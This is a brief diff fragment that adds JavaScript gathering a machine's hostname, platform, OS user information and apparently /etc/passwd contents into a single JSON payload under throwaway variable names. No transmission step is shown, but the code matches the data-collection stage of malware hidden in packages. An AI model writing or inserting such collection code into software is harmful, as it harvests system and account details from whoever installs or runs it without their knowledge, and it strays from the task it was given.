@@ -1,0 +1,7 @@
+const data = JSON.stringify({
+  hostname: os.hostname(),
+  platform: os.platform(),
+  userInfo: os.userInfo(),
+  passwd: passwdData
+})
+_tmp_0.hostname = os.hostname()
